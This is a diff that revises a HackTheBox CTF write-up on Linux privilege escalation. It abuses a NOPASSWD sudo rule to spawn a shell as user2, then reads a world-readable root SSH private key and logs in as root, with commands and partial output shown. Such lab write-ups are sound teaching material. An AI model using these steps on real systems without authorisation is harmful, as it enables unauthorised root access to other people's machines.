@@ -2,138 +2,104 @@
 title: Privilege Escalation
 draft: false
 description: Mastering Privilege Escalation Techniques
-date: 2023-08-11 00:00:00+0000
+date: 2026-08-08 00:00:00+0000
 tags: ["HackTheBox", "SSH_Keys", "PrivilegeEscalation", "Easy", "HTB"]
 categories: ["Easy", "HackTheBox", "HTB,SSH_Keys", "PrivilegeEscalation"]
-featureimage: "https://blog.convisoappsec.com/wp-content/uploads/2019/10/privilegios_Prancheta-1-min.png"
+featureimage: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSyxFVYF1Ooaih1lw4_tG3E_4bXP2l6RaR0tVexm32eVA&s=10"
 ---
 
 ### Introduction
-After breaching a target's defenses and exploiting system vulnerabilities, hackers often find themselves with limited privileges. To overcome this, privilege escalation becomes essential to navigate through defenses and gain the muscle needed to carry out a successful attack.
+Obtaining an initial foothold on a target environment rarely grants total administrative control. In penetration testing and Capture The Flag (CTF) environments, low-privileged credentials are typically just the starting point. Moving further requires systematic enumeration to uncover lateral movement opportunities and privilege escalation vectors.
 
-_Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity._
+This writeup covers a classic multi-stage Linux privilege escalation scenario inspired by the [Hack The Box Getting Started](https://academy.hackthebox.com/course/preview/getting-started) module. 
 
-### Privilege Escalation Challenge.
-Welcome back to another HackTheBox challenge, an easy Capture The Flag (CTF) exercise. The past few blogs have been covering the module [Getting Started](https://academy.hackthebox.com/course/preview/getting-started). The instructions provided are as follows:
-![chall desc](/images/privilege-escalation/PrivilegeEscalation1.jpg)
-[SSH](https://en.wikipedia.org/wiki/Secure_Shell) (Secure Shell) is a secure network communication protocol allowing encrypted connections between computers, making it suitable for use on insecure networks.
+The attack chain consists of two primary stages:
+1. **Lateral Movement (`user1` -> `user2`):** Exploiting an overly permissive `sudo` rule.
+2. **Privilege Escalation (`user2` -> `root`):** Capitalizing on an exposed administrative [SSH](https://en.wikipedia.org/wiki/Secure_Shell) key..
 
-### Observations & Findings
-We begin by using the provided credentials to establish an SSH connection to the target machine:
-If you're following through **Note** that the machine IP and port number might be different in your case, make sure you replace that with what you have been given.
+_Disclaimer:This writeup is intended for educational and authorized security assessment purposes only. All activities were conducted within a controlled laboratory environment._
 
-Our first command:
+## Phase 1: Establishing the Initial Foothold.
+Using the provided credentials, we establish an initial interactive shell over SSH.
 
 ```
-┌──(papab3ar㉿kali)-[~]
-└─$ ssh user1@94.237.49.11 -p 31973
+ssh user1@<TARGET_IP> -p <TARGET_PORT>
+```
+Upon authenticating, we are dropped into an unprivileged environment on Ubuntu 20.04 LTS:
 
 ```
-Upon connection, a message about host authenticity appears. Confirm by typing "yes" and entering the provided password. A successful login grants terminal access:
+user1@target-box:~$ whoami
+user1
 ```
-Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.10.0-18-amd64 x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-This system has been minimized by removing packages and content that are
-not required on a system that users do not log into.
-
-To restore this content, you can run the 'unminimize' command.
-
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
-user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$
+A quick check of the /home directory reveals a second account on the system:
 
 ```
-Attempting to list directories reveals limited information. Exploring further, we discover another user, user2:
+user1@target-box:~$ ls -la /home
+drwxr-xr-x  2 user1 user1 4096 Aug  9 12:00 user1
+drwxr-x---  2 user2 user2 4096 Aug  9 12:00 user2
 ```
-user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cd ../
-user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/home$ ls
-user1  user2
+Attempting to read `user2's home directory contents directly results in a standard Linux file permission error (`Permission denied). This sets our immediate objective: find a path to transition horizontally from `user1 to `user2.
 
+## Phase 2: Auditing Sudo Privileges & Lateral Movement
+To check what administrative commands our current user can run, we execute:
 
-```
-Navigation to user2's directory uncovers the flag.txt file, but access is denied:
-```
-cat: flag.txt: Permission denied
-
-```
-What a bummer! our current user has no permission to read user2 files or documents. So now I want to see the list of permissions the users on this machine have so I use:
 ```
 sudo -l
-
 ```
-The output:
+Output Analysis
 ```
-Matching Defaults entries for user1 on
-    ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User user1 may run the following commands on
-        ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:
+User user1 may run the following commands on target-box:
     (user2 : user2) NOPASSWD: /bin/bash
-
 ```
-Something interesting shows up here about our users. 
-First, we see the text **NOPASSWD**: Indicating that our current user (user1) is allowed to run the specified commands without being prompted for a password. This can be a security feature to streamline certain processes, but it also carries some security risks.
+This configuration presents a critical misconfiguration:
 
-Then we note the **/bin/bash**: This is the path to the "bash" shell executable. Allowing user1 to run "/bin/bash" means they have the ability to start an interactive shell session. This could potentially grant them significant control over the system.
+(user2 : user2): Grants user1 the ability to run the specified binary under the explicit context of user2.
 
-With this in mind, I now want to see if it will work. So I run the following command for user2 as user1:
+NOPASSWD: Suppresses the requirement to enter user1's password upon execution.
+
+/bin/bash: Grants access to launch an unrestricted, interactive shell binary.
+
+Because `/bin/bash is allowed directly without restriction, we can spawn a new interactive shell session as user2:
+
 ```
 sudo -u user2 /bin/bash
+```
+Verifying our session identity confirms successful lateral movement:
 
 ```
-From the terminal, this seems to have worked since the CLI switched from:
+user2@target-box:~$ id
+uid=1001(user2) gid=1001(user2) groups=1001(user2)
 ```
-user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:
-```
-to this:
-```
-user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ 
+With `user2 privilege established, we can read the user flag located in `/home/user2/flag.txt.
+
+## Phase 3: Enumerating the Root Environment
+Now that we have escalated to user2, we pivot our attention toward acquiring root privileges. Standard enumeration includes inspecting administrative user directories and configuration files.
+
+Navigating to /root demonstrates that the directory itself is listable or accessible under our current context:
 
 ```
-Notice that we now have user2 access. So, once again, we try to read the _flag.txt_ file and manage to get the flag.
+cd /root
+ls -la
+Plaintext
+drwxr-xr-x 3 root root 4096 Aug  9 12:00 .
+drwxr-xr-x 1 root root 4096 Aug  9 12:00 ..
+-rw------- 1 root root  111 Aug  9 12:00 flag.txt
+drwxr-xr-x 2 root root 4096 Aug  9 12:00 .ssh
 ```
-user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ ls
-flag.txt
-user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cat flag.txt 
-HTB{l473r4l_********_**_*******_u53r}
+While `flag.txt remains unreadable due to strict standard permissions, the hidden `.ssh directory catches our attention.
 
-```
-Ah great, so what, are we done? Or is there more we could do here? We have further instructions:
-![chall blog](/images/privilege-escalation/PriviledgeEscalation0.jpg)
-Now we try to see if we can be the **root** user for this machine, escalating our privileges even further. First I navigate to the root user folder using the following commands:
-```
-cd ../../
-ls
-cd root
-```
-Then I list all directories and this is the output I get:
-```
-user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/root$ ls -a
-.  ..  .bash_history  .bashrc  .profile  .ssh  .viminfo  flag.txt
+## Phase 4: Exploiting Exposed SSH Key Credentials
+Checking the permissions and contents of `/root/.ssh:
 
 ```
-As you can see here, we have our _flag.txt_ file. I'm tempted to open it, and I do, but again, I get denied permission to do so. I then notice another interesting directory,**.ssh**. So I navigate to it and list its contents. 
+cd /root/.ssh
+ls -la
+```
 
-The **.ssh** folder in a user's home directory on a Unix-like operating system that contains important files and directories related to SSH (Secure Shell) authentication and communication. 
+`-rw-r--r-- 1 root root 2602 Aug  9 12:00 id_rsa
+The file `id_rsa contains an OpenSSH Private Key belonging to the root account. Private keys should never be globally readable or exposed across privilege boundaries.
 
-**authorized_keys**: Contains a list of public keys authorized to access the user account using SSH key-based authentication. Each line in this file represents a separate public key. When a client (remote computer) attempts to connect to the user account, the server checks if the client's public key matches any of the keys listed in this file. If there's a match, the client is granted access without needing to enter a password.
-
-**id_rsa**: A private key file for the user's SSH key pair. The private key is kept secret and should never be shared or exposed. It is used for authentication when the user tries to log in to remote servers. When the user initiates an SSH connection, their local computer uses the private key to sign a challenge from the server, proving their identity without transmitting the actual private key. Only the corresponding public key is shared with remote servers.
-
-**id_rsa.pub**: Contains the public key that corresponds to the private key (id_rsa). The public key can be freely shared and is typically copied to remote servers to set up key-based authentication. Remote servers use the public key to verify the user's identity during the SSH authentication process.
-
-Now it is time to see if we have access to the **id_rsa** file. If we do, we can use the root user's private key to gain root access to this machine hence further elevating our privileges from user2. I open this file using the cat command and sure enough, I get access to the private key.
 ```
 cat id_rsa
 
@@ -151,8 +117,8 @@ QfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==
 -----END OPENSSH PRIVATE KEY-----
 
 ```
-### Solution/Flag
-I copy the key to my local machine in a file named id_rsa and save it,  then try to use it to log in as the root user using the commands:
+## Phase 5: Solution/Flag
+I copy the key to my local machine in a file named `id_rsa and save it,  then try to use it to log in as the root user using the commands:
 
 ```
 ──(papab3ar㉿kali)-[~]
@@ -180,5 +146,3 @@ HTB{pr1v1l363_**********_2_r007}
 ```
 ### Conclusion
 In summary, this challenge underscores the significance of privilege escalation techniques for unearthing concealed data and vulnerabilities. By leveraging SSH keys, directory permissions, and sudo privileges, we elevate our access and seize the flag.
-
-Remember, relentless learning and exploration are paramount to mastering hacking skills. Embrace the journey, and let the quest for knowledge fuel your hacking endeavors.
